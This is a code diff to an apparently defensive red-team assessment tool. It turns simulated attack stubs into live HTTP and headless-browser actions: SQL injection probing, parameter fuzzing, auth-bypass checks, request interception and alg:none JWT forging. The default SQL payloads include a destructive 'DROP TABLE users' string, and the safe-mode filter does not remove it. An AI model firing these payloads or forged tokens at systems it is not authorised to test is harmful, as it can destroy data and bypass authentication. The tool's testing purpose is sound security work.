@@ -83,48 +83,89 @@ class RedTeamReport:
 
 
 class AttackExecutor:
-    """Executes individual attack steps."""
-    
+    """Executes individual attack steps with real Playwright/HTTP."""
+
     def __init__(
         self,
         root: Path,
         target_url: str = None,
         safe_mode: bool = True,
         on_progress: Callable[[str], None] = None,
+        evidence_dir: Path | None = None,
     ):
         self.root = root
-        self.target_url = target_url
+        self.target_url = target_url or "http://127.0.0.1:1612"
         self.safe_mode = safe_mode
         self.on_progress = on_progress or (lambda _: None)
-        self.session = None  # aiohttp session for HTTP requests
-        self.browser = None  # Playwright browser for browser actions
-    
+        self.session = None  # aiohttp session
+        self.browser = None  # Playwright browser
+        self._playwright = None
+        self._evidence_dir = evidence_dir or (root / ".patchi" / "evidence")
+        self._evidence_dir.mkdir(parents=True, exist_ok=True)
+        self._evidence: list[dict] = []
+        self._screenshot_count = 0
+
     async def initialize(self):
-        """Initialize HTTP session and browser if needed."""
-        if self.target_url:
-            try:
-                import aiohttp
-                self.session = aiohttp.ClientSession()
-            except ImportError:
-                _log.warning("aiohttp not available, HTTP attacks limited")
-        
-        # Browser for browser-based attacks
+        """Initialize HTTP session and Playwright browser."""
+        # HTTP session
+        try:
+            import aiohttp
+            timeout = aiohttp.ClientTimeout(total=15)
+            self.session = aiohttp.ClientSession(timeout=timeout)
+        except ImportError:
+            _log.warning("aiohttp not available — HTTP attacks limited")
+
+        # Playwright browser
         try:
             from playwright.async_api import async_playwright
             self._playwright = await async_playwright().start()
-            self.browser = await self._playwright.chromium.launch(headless=True)
+            self.browser = await self._playwright.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"],
+            )
+            self.on_progress("  Browser initialized (headless Chromium)")
         except ImportError:
-            _log.warning("Playwright not available, browser attacks limited")
-    
+            _log.warning("Playwright not available — browser attacks limited")
+        except Exception as e:
+            _log.warning("Playwright launch failed: %s", e)
+
     async def cleanup(self):
         """Clean up resources."""
         if self.session:
             await self.session.close()
         if self.browser:
             await self.browser.close()
-        if hasattr(self, '_playwright'):
+        if self._playwright:
             await self._playwright.stop()
-    
+
+    # ── Evidence capture ────────────────────────────────────────────────────
+
+    async def _capture_screenshot(self, page, label: str) -> str | None:
+        """Take a screenshot and return its path."""
+        if not page:
+            return None
+        self._screenshot_count += 1
+        path = self._evidence_dir / f"{self._screenshot_count:04d}_{label}.png"
+        try:
+            await page.screenshot(path=str(path), full_page=False)
+            return str(path)
+        except Exception as e:
+            _log.warning("Screenshot failed: %s", e)
+            return None
+
+    def _record_evidence(self, step_num: int, action: str, evidence: dict) -> None:
+        """Record evidence for the report."""
+        evidence["step"] = step_num
+        evidence["action"] = action
+        evidence["timestamp"] = time.time()
+        self._evidence.append(evidence)
+
+    def get_evidence(self) -> list[dict]:
+        """Return all captured evidence."""
+        return list(self._evidence)
+
+    # ── Execute step ────────────────────────────────────────────────────────
+
     async def execute_step(
         self,
         step: dict,
@@ -136,9 +177,9 @@ class AttackExecutor:
         step_num = step.get("step", 0)
         action = step.get("action", "")
         tool = step.get("tool", "")
-        
+
         self.on_progress(f"  Step {step_num}: {action} ({tool})")
-        
+
         try:
             if tool == "fuzz_params":
                 result = await self._fuzz_params(step, scenario, context)
@@ -154,7 +195,14 @@ class AttackExecutor:
                 result = await self._jwt_tool(step, scenario, context)
             else:
                 result = {"success": False, "error": f"Unknown tool: {tool}"}
-            
+
+            self._record_evidence(step_num, action, {
+                "tool": tool,
+                "success": result.get("success", False),
+                "evidence": result.get("evidence", ""),
+                "data": result.get("data", {}),
+            })
+
             duration = int((time.monotonic() - start) * 1000)
             return AttackStepResult(
                 step=step_num,
@@ -174,80 +222,333 @@ class AttackExecutor:
                 error=str(e),
                 duration_ms=duration,
             )
-    
-    async def _fuzz_params(self, step: dict, scenario: dict, context: dict) -> dict:
-        """Fuzz parameters to find injection points."""
-        # In safe_mode, only test with harmless payloads
-        payloads = step.get("payloads", [])
-        if self.safe_mode:
-            payloads = [p for p in payloads if not any(d in p for d in ["DROP", "DELETE", "UPDATE", "INSERT", "exec", "system"])]
-        
-        # This would actually send requests and analyze responses
-        # For now, return simulated result
-        return {
-            "success": True,
-            "evidence": f"Tested {len(payloads)} payloads against parameters",
-            "data": {"tested_payloads": payloads[:5]},
-        }
-    
-    async def _sql_payload(self, step: dict, scenario: dict, context: dict) -> dict:
-        """Execute SQL injection payload."""
-        if self.safe_mode:
-            # In safe mode, only test for error reflection, not actual extraction
-            return {
-                "success": True,
-                "evidence": "Safe mode: tested for SQL error reflection only",
-                "data": {"mode": "safe", "payload_tested": step.get("payloads", [])[:3]},
-            }
-        
-        # Real exploitation would go here
-        return {
-            "success": False,
-            "error": "Full exploitation not implemented in safe mode",
-        }
-    
+
+    # ── HTTP requests (real) ────────────────────────────────────────────────
+
     async def _http_request(self, step: dict, scenario: dict, context: dict) -> dict:
-        """Send HTTP request with payload."""
+        """Send real HTTP request with payload and capture response."""
         if not self.session:
             return {"success": False, "error": "No HTTP session"}
-        
-        # This would send actual requests
+
+        url = step.get("url", self.target_url)
+        method = step.get("method", "GET").upper()
+        payloads = step.get("payloads", [])
+        headers = step.get("headers", {})
+        data = step.get("data", {})
+
+        # Apply payloads to URL params or form data
+        if payloads:
+            for i, payload in enumerate(payloads[:5]):  # cap at 5
+                test_url = url
+                test_data = dict(data)
+
+                # Inject payload into URL params
+                if "?" in test_url:
+                    test_url += f"&input={payload}"
+                else:
+                    test_url += f"?input={payload}"
+
+                # Also inject into form data
+                if test_data:
+                    for key in list(test_data.keys()):
+                        test_data[key] = payload
+
+                try:
+                    async with self.session.request(
+                        method, test_url, headers=headers, json=test_data if test_data else None
+                    ) as resp:
+                        body = await resp.text()
+                        # Check for SQL error messages
+                        error_indicators = [
+                            "sql syntax", "mysql", "sqlite", "postgresql",
+                            "ora-", "unquoted parameter", "microsoft ole db",
+                            "odbc", "jdbc", "syntax error",
+                        ]
+                        has_error = any(ind in body.lower() for ind in error_indicators)
+
+                        if has_error:
+                            return {
+                                "success": True,
+                                "evidence": f"SQL error reflected with payload: {payload[:50]}",
+                                "data": {
+                                    "payload": payload,
+                                    "status": resp.status,
+                                    "error_reflection": body[:200],
+                                },
+                            }
+                except Exception as e:
+                    _log.debug("HTTP request failed: %s", e)
+                    continue
+
+        # No payloads — just send a normal request
+        try:
+            async with self.session.request(method, url, headers=headers) as resp:
+                body = await resp.text()
+                return {
+                    "success": resp.status < 400,
+                    "evidence": f"HTTP {method} {url} → {resp.status} ({len(body)} bytes)",
+                    "data": {
+                        "status": resp.status,
+                        "headers": dict(resp.headers),
+                        "body_preview": body[:500],
+                    },
+                }
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    async def _fuzz_params(self, step: dict, scenario: dict, context: dict) -> dict:
+        """Fuzz parameters to find injection points."""
+        if not self.session:
+            return {"success": False, "error": "No HTTP session"}
+
+        payloads = step.get("payloads", [])
+        if self.safe_mode:
+            payloads = [p for p in payloads if not any(d in p.upper() for d in ["DROP", "DELETE", "UPDATE", "INSERT", "EXEC", "SYSTEM"])]
+
+        url = step.get("url", self.target_url)
+        findings = []
+
+        for payload in payloads[:10]:  # cap at 10
+            try:
+                test_url = f"{url}?fuzz={payload}"
+                async with self.session.get(test_url) as resp:
+                    body = await resp.text()
+                    # Check for error reflection, stack traces, or interesting responses
+                    if resp.status >= 500:
+                        findings.append({"payload": payload, "status": resp.status, "type": "server_error"})
+                    elif any(kw in body.lower() for kw in ["traceback", "exception", "stack trace"]):
+                        findings.append({"payload": payload, "status": resp.status, "type": "info_disclosure"})
+                    elif payload in body:  # payload reflected in response
+                        findings.append({"payload": payload, "status": resp.status, "type": "reflected"})
+            except Exception:
+                continue
+
         return {
             "success": True,
-            "evidence": "HTTP request sent (simulated)",
-            "data": {},
+            "evidence": f"Fuzzed {len(payloads)} payloads, found {len(findings)} interesting responses",
+            "data": {"findings": findings, "tested": len(payloads)},
         }
-    
-    async def _code_scan(self, step: dict, scenario: dict, context: dict) -> dict:
-        """Scan code for patterns."""
-        patterns = step.get("patterns", [])
-        # Use existing code scanning capabilities
+
+    async def _sql_payload(self, step: dict, scenario: dict, context: dict) -> dict:
+        """Execute SQL injection payload and check for error reflection."""
+        if not self.session:
+            return {"success": False, "error": "No HTTP session"}
+
+        url = step.get("url", self.target_url)
+        payloads = step.get("payloads", [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "admin'--",
+            "' UNION SELECT NULL--",
+            "1; DROP TABLE users--",
+        ])
+
+        sql_indicators = [
+            "sql syntax", "mysql", "sqlite", "postgresql",
+            "ora-", "unquoted", "microsoft ole db", "odbc",
+            "warning.*mysql", "unclosed quotation mark",
+        ]
+
+        results = []
+        for payload in payloads:
+            try:
+                test_url = f"{url}?id={payload}"
+                async with self.session.get(test_url) as resp:
+                    body = await resp.text()
+                    has_sql_error = any(ind in body.lower() for ind in sql_indicators)
+                    results.append({
+                        "payload": payload,
+                        "status": resp.status,
+                        "sql_error": has_sql_error,
+                        "response_preview": body[:200] if has_sql_error else "",
+                    })
+                    if has_sql_error:
+                        return {
+                            "success": True,
+                            "evidence": f"SQL injection confirmed: {payload} → SQL error reflected",
+                            "data": {"results": results, "confirmed": True},
+                        }
+            except Exception:
+                continue
+
         return {
             "success": True,
-            "evidence": f"Scanned for {len(patterns)} patterns",
-            "data": {"patterns": patterns},
+            "evidence": f"Tested {len(payloads)} SQL payloads, no error reflection found",
+            "data": {"results": results, "confirmed": False},
         }
-    
+
+    # ── Browser automation (real Playwright) ────────────────────────────────
+
     async def _browser_action(self, step: dict, scenario: dict, context: dict) -> dict:
-        """Execute browser automation actions."""
+        """Execute real browser automation with Playwright."""
         if not self.browser:
             return {"success": False, "error": "Browser not available"}
-        
-        # Would use Playwright to automate browser
+
+        action_type = step.get("action_type", "navigate")
+        url = step.get("url", self.target_url)
+        selector = step.get("selector", "")
+        value = step.get("value", "")
+
+        page = await self.browser.new_page()
+        evidence = {"url": url, "action": action_type}
+
+        try:
+            if action_type == "navigate":
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                evidence["title"] = await page.title()
+                evidence["screenshot"] = await self._capture_screenshot(page, f"nav_{step.get('step', 0)}")
+
+            elif action_type == "click":
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                if selector:
+                    await page.click(selector)
+                    await page.wait_for_load_state("domcontentloaded")
+                evidence["screenshot"] = await self._capture_screenshot(page, f"click_{step.get('step', 0)}")
+
+            elif action_type == "fill":
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                if selector and value:
+                    await page.fill(selector, value)
+                evidence["screenshot"] = await self._capture_screenshot(page, f"fill_{step.get('step', 0)}")
+
+            elif action_type == "fill_and_submit":
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                if selector and value:
+                    await page.fill(selector, value)
+                    # Try to find and click submit button
+                    submit = await page.query_selector("button[type=submit], input[type=submit], button:has-text('Login'), button:has-text('Submit')")
+                    if submit:
+                        await submit.click()
+                        await page.wait_for_load_state("domcontentloaded")
+                evidence["screenshot"] = await self._capture_screenshot(page, f"submit_{step.get('step', 0)}")
+                evidence["final_url"] = page.url
+
+            elif action_type == "check_auth_bypass":
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                # Check if we can access protected resource without auth
+                content = await page.content()
+                has_login_form = bool(await page.query_selector("input[type=password]"))
+                has_dashboard = any(kw in content.lower() for kw in ["dashboard", "welcome", "logout", "admin"])
+                evidence["has_login_form"] = has_login_form
+                evidence["has_dashboard"] = has_dashboard
+                evidence["bypassed"] = has_dashboard and not has_login_form
+                evidence["screenshot"] = await self._capture_screenshot(page, f"bypass_{step.get('step', 0)}")
+
+            elif action_type == "screenshot":
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                evidence["screenshot"] = await self._capture_screenshot(page, f"capture_{step.get('step', 0)}")
+                evidence["title"] = await page.title()
+
+            elif action_type == "intercept_requests":
+                captured_requests = []
+
+                async def on_request(request):
+                    captured_requests.append({
+                        "method": request.method,
+                        "url": request.url,
+                        "headers": dict(request.headers),
+                    })
+
+                page.on("request", on_request)
+                await page.goto(url, wait_until="domcontentloaded", timeout=10000)
+                await page.wait_for_timeout(2000)  # let requests settle
+                evidence["captured_requests"] = captured_requests[:20]
+                evidence["request_count"] = len(captured_requests)
+                evidence["screenshot"] = await self._capture_screenshot(page, f"intercept_{step.get('step', 0)}")
+
+            else:
+                evidence["error"] = f"Unknown browser action: {action_type}"
+
+            return {
+                "success": True,
+                "evidence": f"Browser {action_type} on {url}",
+                "data": evidence,
+            }
+
+        except Exception as e:
+            evidence["error"] = str(e)
+            return {
+                "success": False,
+                "evidence": f"Browser action failed: {e}",
+                "data": evidence,
+            }
+        finally:
+            await page.close()
+
+    # ── Code scan (static) ──────────────────────────────────────────────────
+
+    async def _code_scan(self, step: dict, scenario: dict, context: dict) -> dict:
+        """Scan codebase for vulnerability patterns."""
+        patterns = step.get("patterns", [])
+        findings = []
+
+        for py_file in sorted(self.root.rglob("*.py")):
+            if ".patchi" in str(py_file) or "__pycache__" in str(py_file):
+                continue
+            try:
+                content = py_file.read_text(encoding="utf-8", errors="ignore")
+            except OSError:
+                continue
+
+            for pattern in patterns:
+                if pattern.lower() in content.lower():
+                    # Find the line
+                    for i, line in enumerate(content.splitlines(), 1):
+                        if pattern.lower() in line.lower():
+                            findings.append({
+                                "file": str(py_file.relative_to(self.root)),
+                                "line": i,
+                                "pattern": pattern,
+                                "context": line.strip()[:100],
+                            })
+                            break
+
         return {
             "success": True,
-            "evidence": "Browser action executed (simulated)",
-            "data": {},
+            "evidence": f"Scanned for {len(patterns)} patterns, found {len(findings)} matches",
+            "data": {"findings": findings[:20]},
         }
-    
+
+    # ── JWT tool ────────────────────────────────────────────────────────────
+
     async def _jwt_tool(self, step: dict, scenario: dict, context: dict) -> dict:
-        """JWT manipulation tool."""
-        # Would use PyJWT to manipulate tokens
-        return {
-            "success": True,
-            "evidence": "JWT operation executed (simulated)",
-            "data": {},
-        }
+        """Manipulate JWT tokens for auth testing."""
+        action = step.get("jwt_action", "decode")
+        token = step.get("token", "")
+
+        try:
+            import base64
+            import json as _json
+
+            if action == "decode" and token:
+                # Decode JWT without verification
+                parts = token.split(".")
+                if len(parts) >= 2:
+                    # Decode payload
+                    payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
+                    decoded = _json.loads(base64.urlsafe_b64decode(payload))
+                    return {
+                        "success": True,
+                        "evidence": f"JWT decoded: {list(decoded.keys())}",
+                        "data": {"header": _json.loads(base64.urlsafe_b64decode(parts[0] + "==")), "payload": decoded},
+                    }
+
+            elif action == "alg_none":
+                # Try to forge token with alg:none
+                if token:
+                    parts = token.split(".")
+                    if len(parts) >= 3:
+                        forged = parts[0] + "." + parts[1] + "."
+                        return {
+                            "success": True,
+                            "evidence": "Forged JWT with alg:none (test if server accepts)",
+                            "data": {"forged_token": forged[:100]},
+                        }
+
+            return {"success": False, "error": f"Unknown JWT action: {action}"}
+
+        except Exception as e:
+            return {"success": False, "error": str(e)}
 
 
 class RedTeamEngine:
@@ -385,11 +686,13 @@ class RedTeamEngine:
         self.on_progress(f"📋 Selected {len(scenarios)} attack scenarios")
         
         # Initialize executor
+        evidence_dir = self.root / ".patchi" / "evidence" / assessment_id
         executor = AttackExecutor(
             self.root,
             target_url=self.target_url,
             safe_mode=self.safe_mode,
             on_progress=self.on_progress,
+            evidence_dir=evidence_dir,
         )
         await executor.initialize()
         
@@ -418,10 +721,18 @@ class RedTeamEngine:
                 playbook = scenario.get("remediation_playbook")
                 if playbook and playbook not in report.remediation_playbooks:
                     report.remediation_playbooks.append(playbook)
-        
+
+            # Capture evidence from executor
+            report.exploit_evidence = {
+                "screenshots": len([e for e in executor.get_evidence() if e.get("data", {}).get("screenshot")]),
+                "total_steps": len(executor.get_evidence()),
+                "evidence_dir": str(executor._evidence_dir),
+                "evidence": executor.get_evidence()[:50],
+            }
+
         finally:
             await executor.cleanup()
-        
+
         report.completed_at = datetime.now(timezone.utc).isoformat()
         report.duration_ms = int((time.monotonic() - start_time) * 1000)
         
@@ -492,9 +803,13 @@ class RedTeamEngine:
             message=f"{scenario['name']}: {scenario.get('description', '')}",
             detail=f"Attack scenario {scenario['id']} completed successfully. Steps: {result.steps_completed}/{result.total_steps}",
             cwe=scenario.get("cwe", ""),
-            owasp_category=scenario.get("owasp", ""),
-            remediation=scenario.get("remediation_playbook", ""),
-            tags=scenario.get("tags", []),
+            suggestion=f"Apply remediation playbook: {scenario.get('remediation_playbook', 'manual review')}",
+            extra={
+                "owasp": scenario.get("owasp", ""),
+                "remediation_playbook": scenario.get("remediation_playbook", ""),
+                "tags": scenario.get("tags", []),
+                "scenario_id": scenario["id"],
+            },
         )
         findings.append(finding)
         
